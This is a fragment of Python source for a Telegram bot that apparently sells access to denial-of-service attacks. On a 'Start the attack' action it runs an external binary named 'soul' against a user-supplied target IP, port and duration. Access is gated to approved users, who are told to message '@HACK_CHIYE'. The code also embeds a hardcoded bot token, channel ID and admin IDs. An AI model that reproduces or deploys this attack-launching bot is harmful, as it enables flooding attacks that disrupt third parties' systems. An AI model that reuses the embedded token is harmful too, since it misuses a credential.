...
TOKEN = '7899170021:AAEzigRbTCbXQnXK4UAlalpCq4BJegLOuD0'
CHANNEL_ID = -1002234223582
ADMIN_IDS = [1257888659]
    ...
    try:
        if action == 1:  # Start the attack
            process = subprocess.Popen(
                ["./soul", target_ip, str(target_port), str(attack_time), "150"],
...
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED. DM @HACK_CHIYE FOR ACCESS*", parse_mode='Markdown')
...
def approve_user(message):
    if not is_user_admin(message.from_user.id, message.chat.id):
        bot.send_message(message.chat.id, "*You are not authorized to use this command.Dm @Hack_chiye for access*", parse_mode='Markdown')
        return
